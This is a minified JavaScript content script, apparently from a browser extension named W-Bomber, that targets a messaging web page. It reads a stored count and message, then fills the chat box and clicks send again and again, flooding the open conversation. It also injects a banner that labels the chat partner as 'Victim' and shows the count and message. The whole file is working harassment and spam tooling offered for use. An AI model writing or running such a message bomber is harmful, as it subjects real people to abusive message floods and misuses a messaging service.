function selfBomber(e,t){window.InputEvent=window.Event||window.InputEvent;for(var n=document.getElementsByClassName("_3FRCZ copyable-text selectable-text")[1],i=new InputEvent("input",{bubbles:!0}),o=0;o<e;o++)n.textContent=t,n.dispatchEvent(i),document.querySelector("#main > footer > div._3ee1T._1LkpH.copyable-area > div:nth-child(3) > button > span").click()}var _N,_V,_S="";_V=document.querySelector("._1iFv8 > div._33QME > div._2FCjS > div.DP7CM > span._3ko75._5h6Y_._3Whw5 ").textContent,chrome.storage.local.get("n",function(e){_N=e.n}),chrome.storage.local.get("s",function(e){_S=e.s,selfBomber(_N,_S),document.querySelector("#side > span._1DzHI").innerHTML="<style type='text/css' id='wbomber-inject'> ._j100{padding: 12px; background: #0c0c0f;}._j100>img{width: 90px!important;}._j200{margin-top: 0.5em;}._j200>label{color: #c3c3c3; font-size: 14px; font-weight: 500; font-family: inherit;}._j200 > a{color: #06d755;font-size: 12px;}</style><div class='_j100'><img alt='W-BOMBER' src='https://user-images.githubusercontent.com/53340269/91641079-be9cae80-ea3f-11ea-857f-268bdc80cb99.png'><div class='_j200'><label>Victim: "+_V+"</label> </div><div class='_j200'><label>Count: "+_N+"</label> </div><div class='_j200'><label>Message: "+_S+"</label> </div><div class='_j200' style='text-align:right;'><a href='https://github.com/4e0x/w-bomber' target='_blank'>Contribute to W-Bomber</a></div></div>"});
